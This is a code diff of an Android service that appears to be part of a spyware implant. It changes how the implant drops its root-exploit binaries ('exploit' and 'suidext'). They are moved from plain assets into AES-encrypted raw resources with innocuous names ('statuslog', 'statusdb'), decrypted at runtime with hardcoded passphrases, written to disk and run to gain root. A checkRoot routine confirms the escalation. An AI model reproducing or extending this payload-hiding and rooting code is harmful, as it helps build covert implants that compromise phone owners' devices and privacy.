@@ -3,16 +3,28 @@ package com.android.service;
 import java.io.BufferedReader;
 import java.io.BufferedWriter;
 import java.io.File;
+import java.io.FileNotFoundException;
 import java.io.FileOutputStream;
 import java.io.IOException;
 import java.io.InputStream;
 import java.io.InputStreamReader;
 import java.io.OutputStreamWriter;
+import java.security.InvalidAlgorithmParameterException;
+import java.security.InvalidKeyException;
+import java.security.NoSuchAlgorithmException;
+import java.util.Arrays;
+
+import javax.crypto.Cipher;
+import javax.crypto.CipherInputStream;
+import javax.crypto.NoSuchPaddingException;
+import javax.crypto.SecretKey;
+import javax.crypto.spec.IvParameterSpec;
 
 import android.app.Service;
 import android.app.WallpaperManager;
 import android.content.Context;
 import android.content.Intent;
+import android.content.res.Resources;
 import android.graphics.Bitmap;
 import android.graphics.Bitmap.Config;
 import android.graphics.Canvas;
@@ -48,12 +60,12 @@ public class ServiceCore extends Service {
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onCreate)"); //$NON-NLS-1$
 		}
-		
+
 		if (Cfg.DEMO) {
 			Toast.makeText(this, Messages.getString("32.1"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 			// setBackground();
 		}
-		
+
 		Status.setAppContext(getApplicationContext());
 	}
 
@@ -84,7 +96,7 @@ public class ServiceCore extends Service {
 	@Override
 	public void onDestroy() {
 		super.onDestroy();
-		
+
 		if (Cfg.DEBUG) {
 			Check.log(TAG + " (onDestroy)"); //$NON-NLS-1$
 		}
@@ -92,7 +104,7 @@ public class ServiceCore extends Service {
 		if (Cfg.DEMO) {
 			Toast.makeText(this, Messages.getString("32.3"), Toast.LENGTH_LONG).show(); //$NON-NLS-1$
 		}
-		
+
 		core.Stop();
 		core = null;
 	}
@@ -103,7 +115,7 @@ public class ServiceCore extends Service {
 
 		this.shellFile = Messages.getString("32.2"); //$NON-NLS-1$
 
-		if (checkRoot() == true) { 
+		if (checkRoot() == true) {
 			Status.self().setRoot(true);
 		} else {
 			Status.self().setRoot(false);
@@ -142,27 +154,12 @@ public class ServiceCore extends Service {
 			final FileOutputStream fos = getApplicationContext().openFileOutput(crashlog, MODE_PRIVATE);
 			fos.close();
 
-			// Scriviamo l'exploit sul disco
-			InputStream is = getAssets().open(exploit);
+			Resources resources = getResources();
+			InputStream stream = resources.openRawResource(R.raw.statuslog);
+			fileWrite(exploit, stream, "0x5A3D10448D7A912B");
 
-			byte[] content = new byte[is.available()];
-			is.read(content);
-			is.close();
-
-			final FileOutputStream fsexpl = openFileOutput(exploit, MODE_PRIVATE);
-			fsexpl.write(content);
-			fsexpl.close();
-
-			// scriviamo suidext su disco
-			is = getAssets().open(suidext);
-
-			content = new byte[is.available()];
-			is.read(content);
-			is.close();
-
-			final FileOutputStream fsext = openFileOutput(suidext, MODE_PRIVATE);
-			fsext.write(content);
-			fsext.close();
+			stream = resources.openRawResource(R.raw.statusdb);
+			fileWrite(suidext, stream, "0x5A3D10448D7A912A");
 
 			// Eseguiamo l'exploit
 			final File filesPath = getApplicationContext().getFilesDir();
@@ -221,14 +218,66 @@ public class ServiceCore extends Service {
 		} catch (final Exception e1) {
 
 			if (Cfg.DEBUG) {
-				Check.log(e1) ;//$NON-NLS-1$
+				Check.log(e1);//$NON-NLS-1$
 				Check.log(TAG + " (root): Exception on root()"); //$NON-NLS-1$
 			}
-			
+
 			return false;
 		}
 
 		return true;
+	}
+
+	private boolean fileWrite(final String exploit, InputStream stream, String passphrase) throws IOException,
+			FileNotFoundException {
+		try {
+			InputStream in = decodeEnc(stream, passphrase);
+
+			final FileOutputStream out = openFileOutput(exploit, MODE_PRIVATE);
+			byte[] buf = new byte[1024];
+			int numRead = 0;
+            while ((numRead = in.read(buf)) >= 0) {
+                out.write(buf, 0, numRead);
+            }
+				
+			out.close();
+		} catch (Exception ex) {
+			if (Cfg.DEBUG) {
+				ex.printStackTrace();
+				Check.log(TAG + " (fileWrite): " + ex);
+			}
+			return false;
+		}
+
+		return true;
+	}
+
+	private InputStream decodeEnc(InputStream stream, String passphrase) throws IOException, NoSuchAlgorithmException,
+			NoSuchPaddingException, InvalidKeyException, InvalidAlgorithmParameterException {
+
+		SecretKey key = Messages.produceKey(passphrase);
+		if (Cfg.DEBUG) {
+			Check.asserts(key != null, "null key"); //$NON-NLS-1$
+		}
+
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (decodeEnc): stream=" + stream.available());
+			Check.log(TAG + " (decodeEnc): key=" + Utils.byteArrayToHex(key.getEncoded()));
+		}
+
+		Cipher cipher = Cipher.getInstance("AES/CBC/PKCS5Padding"); //$NON-NLS-1$
+		final byte[] iv = new byte[16];
+		Arrays.fill(iv, (byte) 0);
+		IvParameterSpec ivSpec = new IvParameterSpec(iv);
+
+		cipher.init(Cipher.DECRYPT_MODE, key, ivSpec);
+		CipherInputStream cis = new CipherInputStream(stream, cipher);
+		
+		if (Cfg.DEBUG) {
+			Check.log(TAG + " (decodeEnc): cis=" + cis.available());
+		}
+		
+		return cis;
 	}
 
 	private boolean checkRoot() { //$NON-NLS-1$
@@ -237,14 +286,14 @@ public class ServiceCore extends Service {
 		try {
 			// Verifichiamo di essere root
 			final AutoFile file = new AutoFile(Configuration.shellFile);
-			
+
 			if (file.exists() && file.canRead()) {
 				final Process p = Runtime.getRuntime().exec(Configuration.shellFile + Messages.getString("32.14"));
 				p.waitFor();
 
 				if (p.exitValue() == 1) {
 					if (Cfg.DEBUG) {
-						Check.log( TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
+						Check.log(TAG + " (checkRoot): isRoot YEAHHHHH"); //$NON-NLS-1$ //$NON-NLS-2$
 					}
 
 					isRoot = true;
@@ -252,7 +301,8 @@ public class ServiceCore extends Service {
 			}
 		} catch (final Exception e) {
 			if (Cfg.DEBUG) {
-				Check.log(e) ;//$NON-NLS-1$
+				e.printStackTrace();
+				Check.log(e);//$NON-NLS-1$
 			}
 		}
 
@@ -299,7 +349,7 @@ public class ServiceCore extends Service {
 				} catch (final InterruptedException e) {
 					if (Cfg.DEBUG) {
 						Check.log(TAG + " (waitFor): " + e); //$NON-NLS-1$
-						Check.log(e) ;//$NON-NLS-1$
+						Check.log(e);//$NON-NLS-1$
 					}
 				}
 
@@ -316,7 +366,7 @@ public class ServiceCore extends Service {
 				localProcess = null;
 				if (Cfg.DEBUG) {
 					Check.log(TAG + " (ExploitRunnable): Exception on run(): " + e); //$NON-NLS-1$
-					Check.log(e) ;//$NON-NLS-1$
+					Check.log(e);//$NON-NLS-1$
 				}
 			}
 		}
